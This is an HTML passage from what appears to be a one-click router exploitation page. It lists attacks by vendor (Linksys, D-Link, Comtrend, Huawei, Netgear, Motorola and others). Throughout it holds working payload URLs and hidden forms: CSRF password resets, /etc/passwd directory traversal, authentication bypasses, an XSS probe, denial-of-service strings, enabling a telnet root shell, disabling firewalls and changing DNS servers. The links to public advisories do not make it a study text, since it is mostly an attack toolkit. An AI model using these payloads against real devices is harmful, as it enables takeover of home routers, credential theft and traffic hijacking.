<input type="hidden" name="h_wps_cur_status" value="">
</form>
<h2>Cisco</h2>
<h3><a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N</a></h3>

<article>
	<div>02/26/11</div>
	<div><a href="http://www.exploit-db.com/exploits/16252/">[+]</a></div>
	<div><a href="javascript:wag120pass()">WAG120N Change admin password</a></div>
	<div><a href="javascript:wag120passr()">[IP]</a></div>
</article>

<article>
	<div>02/26/11</div>
	<div><a href="http://www.exploit-db.com/exploits/16252/">[+]</a></div>
	<div><a href="javascript:wag120add()">WAG120N Add admin user</a></div>
	<div><a href="javascript:wag120addr()">[IP]</a></div>
</article>

<article>
	<div>05/26/10</div>
	<div><a href="http://seclists.org/bugtraq/2010/Jun/93">[+]</a></div>
	<div><a href="http://192.168.1.245/debug.cgi">WAP54Gv3 debug interface (Gemtek:gemtekswd)</a></div>
	<div><a href="javascript:setip('/debug.cgi')">[IP]</a></div>
</article>

<article>
	<div>02/26/08</div>
	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-4/">[+]</a></div>
	<div><a href="javascript:wrtradmin()">WRT54G enable remote interface</a></div>
	<div><a href="javascript:wrtradminr()">[IP]</a></div>
</article>

<article>
	<div>02/26/08</div>
	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
	<div><a href="http://192.168.1.1/Config.bin">WRT54G config disclosure</a></div>
	<div><a href="javascript:setip('/Config.bin')">[IP]</a></div>
</article>

<article>
	<div>02/26/08</div>
	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
	<div><a href="javascript:document.wrtdefault.submit()">WRT54G restore factory defaults</a></div>
	<div><a href="javascript:wrtdefault()">[IP]</a></div>
</article>

<article>
	<div>01/21/08</div>
	<div><a href="http://swbae.egloos.com/1701135">[+]</a></div>
	<div><a href="http://192.168.1.1/lastpassword.htm">WRT54G last password in plain text</a></div>
	<div><a href="javascript:setip('/lastpassword.htm')">[IP]</a></div>
</article>

<article>
	<div>06/05/06</div>
	<div><a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">[+]</a></div>
	<div><a href="javascript:document.wrtwifi.submit()">WRT54G disable wifi encription</a></div>
	<div><a href="javascript:wrtwifi()">[IP]</a></div>
</article>

<article>
	<div>06/05/06</div>
	<div><a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">[+]</a></div>
	<div><a href="javascript:wrtadmin()">WRT54G change admin password</a></div>
	<div><a href="javascript:wrtadminr()">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="DDWRT">
<h2>DD-WRT</h2>
<h3><a href="javascript:img('DD-WRT')">DD-WRT</a></h3>

<article>
	<div>12/27/10</div>
	<div><a href="http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/">[+]</a></div>
	<div><a href="http://192.168.1.1/Info.live.htm">DD-WRT information disclosure</a></div>
	<div><a href="javascript:setip('/Info.live.htm')">[IP]</a></div>
</article>

<article>
	<div>07/20/09</div>
	<div><a href="http://www.securityfocus.com/bid/35742/info">[+]</a></div>
	<div><a href="javascript:ddwrtexec()">DD-WRT remote comand execution</a></div>
	<div><a href="javascript:ddwrtexecr()">[IP]</a></div>
</article>

<div style="float: right"><a href="#">^ Top</a></div>
</section>


<form name="dsltpass" action="http://192.168.1.1/cgi-bin/webcm" method="post" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="getpage" value="../html/tools/usrmgmt.htm">
<input type="hidden" name="security:settings/username" value="admin">
<input type="hidden" name="security:settings/password" value="password">
<input type="hidden" name="security:settings/password_confirm" value="password">
<input type="hidden" name="security:settings/idle_timeout" value="30">
</form>
<form method="POST" name="dsl2640" action="#"></form>

<section id="DLink">
<h2>D-Link</h2>
<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a></h3>

<article>
	<div>02/19/12</div>
	<div><a href="http://www.exploit-db.com/exploits/18499/">[+]</a></div>
	<div><a href="javascript:DSL2640B();">DSL-2640B change admin password CSRF</a></div>
	<div><a href="javascript:DSL2640Br();">[IP]</a></div>
</article>

<article>
	<div>02/08/12</div>
	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
	<div><a href="javascript:dns320();">DNS-320 DNS-325 command execution</a></div>
	<div><a href="javascript:dns320r();">[IP]</a></div>
</article>

<article>
	<div>02/08/12</div>
	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
	<div><a href="http://192.168.0.1/cgi-bin/discovery.cgi">DNS-320 DNS-325 information disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/discovery.cgi');">[IP]</a></div>
</article>

<article>
	<div>02/08/12</div>
	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
	<div><a href="http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml">DNS-320 DNS-325 information disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml');">[IP]</a></div>
</article>

<article>
	<div>02/10/12</div>
	<div><a href="http://websecurity.com.ua/5567/">[+]</a></div>
	<div><a href="http://192.168.0.50/index.cgi?res_cmd=20&res_buf=null&res_cmd_type=bl&v2=y&rq=y">DAP-1150 save configuration CSRF</a></div>
	<div><a href="javascript:setip('/index.cgi?res_cmd=20&res_buf=null&res_cmd_type=bl&v2=y&rq=y');">[IP]</a></div>
</article>

<article>
	<div>02/10/12</div>
	<div><a href="http://websecurity.com.ua/5567/">[+]</a></div>
	<div><a href="http://192.168.0.50/index.cgi?res_cmd=6&res_buf=null&res_cmd_type=nbl&v2=y&rq=y">DAP-1150 denial of service</a></div>
	<div><a href="javascript:setip('/index.cgi?res_cmd=6&res_buf=null&res_cmd_type=nbl&v2=y&rq=y');">[IP]</a></div>
</article>

<article>
	<div>12/17/11</div>
	<div><a href="http://websecurity.com.ua/5581/">[+]</a></div>
	<div><a href="javascript:dsltpass();">DSL-500T reset password CSRF</a></div>
	<div><a href="javascript:dsltpassr();">[IP]</a></div>
</article>

<article>
	<div>12/22/10</div>
	<div><a href="http://seclists.org/fulldisclosure/2010/Dec/569">[+]</a></div>
	<div><a href="javascript:wbrpass();">WBR-1310 Authentication Bypass set new password</a></div>
	<div><a href="javascript:wbrpassr();">[IP]</a></div>
</article>

<article>
	<div>11/09/10</div>
	<div><a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf">[+]</a></div>
	<div><a href="http://192.168.0.1/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0">DIR-615, DIR-320, DIR-300 Authentication Bypass</a></div>
	<div><a href="javascript:setip('/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0')">[IP]</a></div>
</article>

<article>
	<div>08/24/10</div>
	<div><a href="http://www.xakep.ru/post/53057/&usg=ALkJrhi16ib7RRAB69hwUutq9cFmXxCq7w">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/passwd">DSL-500T Directory Traversal (post auth)</a></div>
	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/etc/passwd');">[IP]</a></div>
</article>

<article>
	<div>08/24/10</div>
	<div><a href="http://www.xakep.ru/post/53057/&usg=ALkJrhi16ib7RRAB69hwUutq9cFmXxCq7w">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/firmwarecfg">DSL-500T old "firmwarecfg" Authentication Bypass</a></div>
	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[IP]</a></div>
</article>

<article>
	<div>06/29/10</div>
	<div><a href="http://www.icysilence.org/?p=413">[+]</a></div>
	<div><a href="http://192.168.0.50/tools_firmw.htm">DAP-1160 Authentication Bypass</a></div>
	<div><a href="javascript:setip('/tools_firmw.htm')">[IP]</a></div>
</article>

<article>
	<div>12/15/09</div>
	<div><a href="http://www.hiredhacker.com/2009/12/15/d-link-dir-615-remote-exploit/">[+]</a></div>
	<div><a href="javascript:dirpass();">DIR-615 change password & enable remote admin</a></div>
	<div><a href="javascript:dirpassr();">[IP]</a></div>
</article>

<article>
	<div>02/05/08</div>
	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
	<div><a href="javascript:dlidns()">DSL-G604T change DNS servers</a></div>
	<div></div>
</article>

<article>
	<div>08/25/08</div>
	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
	<div><a href="http://192.168.0.1/Tools/Admin.shtml">DIR-615 configuration disclosure</a></div>
	<div><a href="javascript:setip('/Tools/Admin.shtml')">[IP]</a></div>
</article>

<article>
	<div>00/00/0?</div>
	<div><a href="http://packetstormsecurity.org/0306-exploits/dlinkDoS.txt">[+]</a></div>
	<div><a href="http://192.168.0.1/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................">704P denial of service</a></div>
	<div><a href="javascript:setip('/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................')">[IP]</a></div>
</article>

<article>
	<div>10/20/06</div>
	<div><a href="http://www.eazel.es/2006/10/20/d-link-dsl-g624t-several-vulnerabilities/">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/webcm?getpage=/./././././././etc/config.xml">DSL-G624T DSL-G604T directory traversal</a></div>
	<div><a href="javascript:setip('/cgi-bin/webcm?getpage=/./././././././etc/config.xml')">[IP]</a></div>
</article>

<article>
	<div>06/06/06</div>
	<div><a href="http://www.intruders.org.br/advisories/dlinkpt.txt">[+]</a></div>
	<div><a href="http://10.0.0.1/cgi-bin/config.cfg">DWL-7x00AP configuration disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/config.cfg')">[IP]</a></div>
</article>

<article>
	<div>05/20/05</div>
	<div><a href="http://secunia.com/advisories/15422/">[+]</a></div>
	<div><a href="http://192.168.0.1/cgi-bin/firmwarecfg">DSL-502T DSL-504T DSL-562T DSL-G604T "firmwarecfg" Authentication Bypass</a></div>
	<div><a href="javascript:setip('/cgi-bin/firmwarecfg')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="comtrend">
<form action="http://192.168.1.1/password.cgi" method="POST" name="comtrendpass">
<input type="hidden" name="sptPassword">
<input type="hidden" name="usrPassword">
<input type="hidden" name="sysPassword">
</form>
<h2>Comtrend</h2>
<h3><a href="javascript:img('Comtrend CT-507IT')">Comtrend CT-507IT</a>, <a href="javascript:img('CT-5367')">CT-5367</a>, <a href="javascript:img('CT-536')">CT-536</a>, <a href="javascript:img('HG-536+')">HG-536+</a>, <a href="javascript:img('CT-5624')">CT-5624</a>, <a href="javascript:img('CT-5363')">CT-5363</a>, <a href="javascript:img('CT-5372/E')">CT-5372/E</a>, <a href="javascript:img('CT-5611T')">CT-5611T</a>, <a href="javascript:img('CT-5621T')">CT-5621T</a>, <a href="javascript:img('CT-6382')">CT-6382</a>, <a href="javascript:img('CT-5071')">CT-5071</a>, <a href="javascript:img('CT-5365')">CT-5365</a>, <a href="javascript:img('VR-3025')">VR-3025</a>, <a href="javascript:img('NexusLink 5631')">NexusLink 5631</a>, <a href="javascript:img('NexusLink 5631E')">NexusLink 5631E</a></h3>

<article>
	<div>01/08/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="javascript:comtrendip()">CT-53XX CT-5071 CT-56XX Put a local IP in DMZ</a></div>
	<div><a href="javascript:ncomtrendipr()">[IP]</a></div>
</article>

<article>
	<div>01/08/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="http://192.168.1.1/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3">CT-53XX CT-5071 CT-56XX Enable remote admin</a></div>
	<div><a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3')">[IP]</a></div>
</article>

<article>
	<div>11/09/11</div>
	<div><a href="http://www.exploit-db.com/exploits/18101/">[+]</a></div>
	<div><a href="javascript:ncomtrendpass()">CT-5624 Change passwords</a></div>
	<div><a href="javascript:ncomtrendpassr()">[IP]</a></div>
</article>

<article>
	<div>03/04/11</div>
	<div><a href="http://www.exploit-db.com/exploits/16275/">[+]</a></div>
	<div><a href="javascript:comtrendpass()">CT-5367 Change passwords</a></div>
	<div><a href="javascript:comtrendpassr()">[IP]</a></div>
</article>

<article>
	<div>03/04/11</div>
	<div><a href="http://www.exploit-db.com/exploits/16275/">[+]</a></div>
	<div><a href="http://192.168.1.1/password.cgi">CT-5367 CT-5624 Information Disclosure</a></div>
	<div><a href="javascript:setip('/password.cgi')">[IP]</a></div>
</article>

<article>
	<div>01/23/10</div>
	<div><a href="http://foro.undersecurity.net/read.php?16,6320">[+]</a></div>
	<div><a href=javascript:urlxss("http://192.168.1.1/scvrtsrv.cmd?action=add&srvName=URLXSS&srvAddr=192.168.1.1&proto=1,&eStart=1,&eEnd=1,&iStart=1,&iEnd=1,");>CT-507IT Cross site scripting</a></div>
</article>

<article>
	<div>03/04/08</div>
	<div><a href="http://seclists.org/bugtraq/2008/Dec/226">[+]</a></div>
	<div><a href="http://192.168.0.1/password.html">CT-536 HG-536+ Information Disclosure</a></div>
	<div><a href="javascript:setip('/password.html')">[IP]</a></div>
</article>

<article>
	<div>03/04/08</div>
	<div><a href="http://archives.neohapsis.com/archives/bugtraq/2008-12/0227.html">[+]</a></div>
	<div><a href="http://192.168.0.1/backupsettings.html">CT-536 HG-536+ Configuration Disclosure</a></div>
	<div><a href="javascript:setip('/backupsettings.html')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="fibrehome">
<h2>Fibrehome</h2>
<h3><a href="javascript:img('Fibrehome HG-110')">Fibrehome HG-110</a></h3>

<article>
	<div>08/04/11</div>
	<div><a href="http://blog.zerial.org">[+]</a></div>
	<div><a href="http://192.168.1.1:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/passwd&var:menu=advanced&var:page=dns">HG-110 Local File Include and Directory/Path Traversal</a></div>
	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/passwd&var:menu=advanced&var:page=dns');">[IP]</a></div>
</article>

<article>
	<div>08/04/11</div>
	<div><a href="http://blog.zerial.org">[+]</a></div>
	<div><a href="http://192.168.1.1:8000/cgi-bin/webproc?getpage=%3Cscript%3Ealert%28this%29%3C/script%3E&var:menu=advanced&var:page=dns">HG-110 Cross site scripting</a></div>
	<div><a href="javascript:setip('/cgi-bin/webproc?getpage=%3Cscript%3Ealert%28this%29%3C/script%3E&var:menu=advanced&var:page=dns')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="huawei">
<h2>Huawei</h2>
<h3><a href="javascript:img('EchoLife HG510')">EchoLife HG510</a>, <a href="javascript:img('HG520b')">HG520b</a>, <a href="javascript:img('EchoLife HG520c')">EchoLife HG520c</a>, <a href="javascript:img('EchoLife HG530')">EchoLife HG530</a>, <a href="javascript:img('SmartAX MT880')">SmartAX MT880</a></h3>

<article>
	<div>01/25/12</div>
	<div><a href="javascript:alert('ADiaz')">[+]</a></div>
	<div><a href="javascript:huappp()">HG5XX remote ppp password disclosure</a></div>
	<div><a href="javascript:huapppr()">[IP]</a></div>
</article>

<article>
	<div>01/11/11</div>
	<div><a href="http://websec.mx/blog/ver/mac2wepkey_huawei">[+]</a></div>
	<div><a href="javascript:mac2wepkey()">HG5XX mac2wepkey default wireless key generator</a></div>
	<div></div>
</article>

<article>
	<div>0?/0?/10</div>
	<div><a href="javascript:alert('SHAKA')">[+]</a></div>
	<div><a href="http://192.168.1.254/Forms/rpADSLMode_1">HG520 rpADSLMode_1 denial of service</a></div>
	<div><a href="javascript:setip('/Forms/rpADSLMode_1')">[IP]</a></div>
</article>

<article>
	<div>10/03/10</div>
	<div><a href="https://www.underground.org.mx/index.php?topic=26005.0">[+]</a></div>
	<div><a href="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@192.168.1.254">HG520 HTTP auth denial of service</a></div>
	<div><a href="javascript:huados()">[IP]</a></div>
</article>

<article>
	<div>05/30/10</div>
	<div><a href="https://www.underground.org.mx/index.php?topic=25598.0">[+]</a></div>
	<div><a href="http://192.168.1.254/Forms/rpEthernet_1">HG520 rpEthernet_1 denial of service</a></div>
	<div><a href="javascript:setip('/Forms/rpEthernet_1')">[IP]</a></div>
</article>

<article>
	<div>05/29/10</div>
	<div><a href="http://www.hakim.ws/huawei/HG520_csrf.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/Forms/rpRManage_1?ACL_active=0">HG520c HG530 enable remote management CSRF</a></div>
	<div><a href="javascript:setip('/Forms/rpRManage_1?ACL_active=0')">[IP]</a></div>
</article>

<article>
	<div>05/16/10</div>
	<div><a href="http://www.hakim.ws/huawei/HG520c_info.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/Listadeparametros.html">HG520c HG530 Listadeparametros.html information disclosure</a></div>
	<div><a href="javascript:setip('/Listadeparametros.html')">[IP]</a></div>
</article>

<article>
	<div>03/28/10</div>
	<div><a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/AutoRestart.html">HG520c HG530 AutoRestart.html denial of service & factory reset</a></div>
	<div><a href="javascript:setip('/AutoRestart.html')">[IP]</a></div>
</article>

<article>
	<div>03/28/10</div>
	<div><a href="http://www.hakim.ws/huawei/HG520c_DoS.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/rpLocalDeviceJump.html?index=HAKIM.WS">HG520 LocalDevicejump.html denial of service</a></div>
	<div><a href="javascript:setip('/rpLocalDeviceJump.html?index=HAKIM.WS')">[IP]</a></div>
</article>

<article>
	<div>02/17/10</div>
	<div><a href="http://netsec.rs/18/huawei-hg510-multiple-vulnerabilities/493/">[+]</a></div>
	<div><a href="http://192.168.1.1/rebootinfo.cgi">HG510 rebootinfo.cgi denial of service</a></div>
	<div><a href="javascript:setip('/rebootinfo.cgi')">[IP]</a></div>
</article>

<article>
	<div>08/24/09</div>
	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
	<div><a href="http://admin:admin@192.168.1.1">SmartAX MT880 default password</a></div>
	<div><a href="javascript:setipadminadmin()">[IP]</a></div>
</article>
	
<article>
	<div>08/24/09</div>
	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
	<div><a href="javascript:mt880admin()">SmartAX MT880 add administrator account</a></div>
	<div><a href="javascript:mt880adminr()">[IP]</a></div>
</article>
	
<article>
	<div>08/24/09</div>
	<div><a href="http://www.exploit-db.com/exploits/9503">[+]</a></div>
	<div><a href="http://admin:admin@192.168.1.1/Action?blacklisting_status=1&bl_list=10&attack_status=0&dos_status=0&id=42&max_tcp=25&max_icmp=25&max_host=70">SmartAX MT880 disable firewall/anti-dos w/default pass</a></div>
	<div><a href="javascript:mt880fw()">[IP]</a></div>
</article>
	
<article>
	<div>00/00/0?</div>
	<div><a href="http://everlost.nl/kender/zyxel/">[+]</a></div>
	<div><a href="http://192.168.1.1/rom-0">ZyNOS configuration disclosure</a></div>
	<div><a href="javascript:setip('/rom-0')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="mifi">
<h2>MiFi</h2>
<h3><a href="javascript:img('2200 Sprint Verizon')">2200 Sprint Verizon</a>, <a href="javascript:img('2352 Vodafone')">2352 Vodafone</a></h3>
	
<article>
	<div>01/16/10</div>
	<div><a href="https://twitter.com/#!/adam_baldwin/status/7832400734">[+]</a></div>
	<div><a href="http://192.168.1.1/config.xml.savefile">2200 Sprint Verizon configuration disclosure</a></div>
	<div><a href="javascript:setip('/config.xml.savefile')">[IP]</a></div>
</article>

<article>
	<div>01/16/10</div>
	<div><a href="http://www.securitybydefault.com/2010/01/vulnerabilidad-en-modemrouter-3g.html">[+]</a></div>
	<div><a href="http://vodafonemobilebroadband.hotspot/config.xml.sav">2352 Vodafone configuration disclosure</a></div>
	<div><a href="javascript:setip('/config.xml.sav')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="motorola">
<img src="" name="img1" style="visibility:hidden">
<img src="" name="img2" style="visibility:hidden">
<h2>Motorola</h2>
<h3><a href="javascript:img('SBG900')">SBG900</a></h3>
	
<article>
	<div>07/22/11</div>
	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
	<div><a href="javascript:motpas()">SBG900 change admin password</a></div>
	<div><a href="javascript:motpasr()">[IP]</a></div>
</article>
	
<article>
	<div>07/22/11</div>
	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
	<div><a href="javascript:motfir()">SBG900 turn off firewall</a></div>
	<div><a href="javascript:motfirr()">[IP]</a></div>
</article>
	
<article>
	<div>07/22/11</div>
	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
	<div><a href="javascript:motrem()">SBG900 enable remote access</a></div>
	<div><a href="javascript:motremr()">[IP]</a></div>
</article>
	
<article>
	<div>07/22/11</div>
	<div><a href="javascript:alert('sirdarckcat')">[+]</a></div>
	<div><a href="javascript:motdns()">SBG900 disable DHCP & add custom DNS server</a></div>
	<div><a href="javascript:motdnsr()">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="netgear">
<form name="netdos"></form>
<h2>Netgear</h2>
<h3><a href="javascript:img('FVS318')">FVS318</a>, <a href="javascript:img('DG632')">DG632</a>, <a href="javascript:img('SSL312 VPN')">SSL312 VPN</a>, <a href="javascript:img('WNR2000')">WNR2000</a>, <a href="javascript:img('WNDAP350')">WNDAP350</a>, <a href="javascript:img('WNAP210')">WNAP210</a>, <a href="javascript:img('WG602')">WG602</a>, <a href="javascript:img('WGR614v9')">WGR614v9</a>, <a href="javascript:img('CG3100D')">CG3100D</a>, <a href="javascript:img('RP614v4')">RP614v4</a></h3>
	
<article>
	<div>04/05/11</div>
	<div><a href="http://osvdb.org/show/osvdb/73422">[+]</a></div>
	<div><a href="javascript:netbyp()">WNAP210 authentication bypass</a></div>
	<div><a href="javascript:netbyp()">[IP]</a></div>
</article>
	
<article>
	<div>07/22/11</div>
	<div><a href="http://www.securityfocus.com/bid/48085/exploit">[+]</a></div>
	<div><a href="javascript:setip('/BackupConfig.php')">WNDAP350, WNAP210 BackupConfig.php config disclosure</a></div>
	<div><a href="javascript:setip('/BackupConfig.php')">[IP]</a></div>
</article>
	
<article>
	<div>08/14/10</div>
	<div><a href="http://packetstormsecurity.org/files/view/94803/netgearcg3100d-escalate.txt">[+]</a></div>
	<div><a href="http://192.168.1.1/__SeContents.html">CG3100D privilege escalation</a></div>
	<div><a href="javascript:setip('/__SeContents.html')">[IP]</a></div>
</article>
	
<article>
	<div>03/24/10</div>
	<div><a href="http://zitstif.no-ip.org/?p=284">[+]</a></div>
	<div><a href="http://192.168.1.1/vgn/jsp/netgear.cfg')">RP614v4 config disclosure</a></div>
	<div><a href="javascript:netconb()">[IP]</a></div>
</article>
	
<article>
	<div>08/24/09</div>
	<div><a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">[+]</a></div>
	<div><a href="javascript:setip('/router-info.htm')">WNR2000 information disclosure</a></div>
	<div><a href="javascript:setip('/router-info.htm')">[IP]</a></div>
</article>
	
<article>
	<div>08/24/09</div>
	<div><a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">[+]</a></div>
	<div><a href="javascript:setip('/router-info.htm')">WNR2000 information disclosure</a></div>
	<div><a href="javascript:setip('/router-info.htm')">[IP]</a></div>
</article>
	
<article>
	<div>08/20/09</div>
	<div><a href="http://seclists.org/fulldisclosure/2009/Aug/280">[+]</a></div>
	<div><a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">WNR2000 config disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">[IP]</a></div>
</article>
	
<article>
	<div>06/15/09</div>
	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">[+]</a></div>
	<div><a href="http://192.168.0.1/gateway/commands/saveconfig.html">DG632 auth bypass (config disclosure)</a></div>
	<div><a href="javascript:setip('/gateway/commands/saveconfig.html');">[IP]</a></div>
</article>
	
<article>
	<div>06/15/09</div>
	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">[+]</a></div>
	<div><a href="http://192.168.0.1/html/modemmenu.htm">DG632 auth bypass</a></div>
	<div><a href="javascript:setip('/html/modemmenu.htm');">[IP]</a></div>
</article>
	
<article>
	<div>06/15/09</div>
	<div><a href="http://www.tomneaves.co.uk/Netgear_DG632_Remote_DoS.txt">[+]</a></div>
	<div><a href="javascript:netdos();">DG632 'firmwarecfg' denial of service</a></div>
	<div><a href="javascript:netdos();">[IP]</a></div>
</article>
	
<article>
	<div>11/13/08</div>
	<div><a href="http://lists.grok.org.uk/pipermail/full-disclosure/2008-November/065619.html">[+]</a></div>
	<div><a href="http://192.168.1.1/?">WGR614v9 denial of service</a></div>
	<div><a href="javascript:setip('/?')">[IP]</a></div>
</article>
	
<article>
	<div>02/27/08</div>
	<div><a href="http://www.helith.net/txt/netgear_ssl312_remote_dos.txt">[+]</a></div>
	<div><a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">SSL312 VPN denial of service</a></div>
	<div><a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">[IP]</a></div>
</article>
	
<article>
	<div>01/24/05</div>
	<div><a href="http://securityvulns.com/Hdocument664.html">[+]</a></div>
	<div><a href="javascript:netcon()">FVS318 content filtering bypass</a></div>
	<div><a href="javascript:netcon()">[IP]</a></div>
</article>
	
<article>
	<div>01/24/05</div>
	<div><a href="http://securityvulns.com/Hdocument664.html">[+]</a></div>
	<div><a href="javascript:netlog()">FVS318 log file arbitrary content injection</a></div>
	<div><a href="javascript:netlog()">[IP]</a></div>
</article>
	
<article>
	<div>08/12/04</div>
	<div><a href="http://archives.neohapsis.com/archives/bugtraq/2004-08/0181.html">[+]</a></div>
	<div><a href="http://192.168.0.1/setup.cgi?todo=debug">DG834G enable telnet root shell</a></div>
	<div><a href="javascript:setip('/setup.cgi?todo=debug')">[IP]</a></div>
</article>
	
<article>
	<div>08/12/04</div>
	<div><a href="http://www.derkeiler.com/Mailing-Lists/Full-Disclosure/2004-06/0176.html">[+]</a></div>
	<div><a href="javascript:netundb()">WG602 undocumented admin account (superman)</a></div>
	<div><a href="javascript:netundb()">[IP]</a></div>
</article>
	
<article>
	<div>08/12/04</div>
	<div><a href="http://archives.neohapsis.com/archives/fulldisclosure/2004-06/0049.html">[+]</a></div>
	<div><a href="javascript:netund()">WG602 undocumented admin account (super)</a></div>
	<div><a href="javascript:netund()">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="siemens">
<h2>Siemens</h2>
<h3><a href="javascript:img('SpeedStream 5200')">SpeedStream 5200</a>, <a href="javascript:img('Gigaset SE461 WiMAX')">Gigaset SE461 WiMAX</a>, <a href="javascript:img('NOKIA Siemens FlexiISN')">NOKIA Siemens FlexiISN</a></h3>

<article>
	<div>03/30/09</div>
	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
	<div><a href="javascript:isnaaa()">FlexiISN auth bypass AAA Configuration</a></div>
	<div><a href="javascript:isnaaa()">[IP]</a></div>
</article>
	
<article>
	<div>03/30/09</div>
	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
	<div><a href="javascript:isnagr()">FlexiISN auth bypass Aggregation Class Configuration</a></div>
	<div><a href="javascript:isnagr()">[IP]</a></div>
</article>
	
<article>
	<div>03/30/09</div>
	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
	<div><a href="javascript:isnggs()">FlexiISN auth bypass GGSN general Configuration</a></div>
	<div><a href="javascript:isnggs()">[IP]</a></div>
</article>
	
<article>
	<div>03/30/09</div>
	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
	<div><a href="javascript:isnser()">FlexiISN auth bypass Network Access & services</a></div>
	<div><a href="javascript:isnser()">[IP]</a></div>
</article>
	
<article>
	<div>06/16/08</div>
	<div></div>
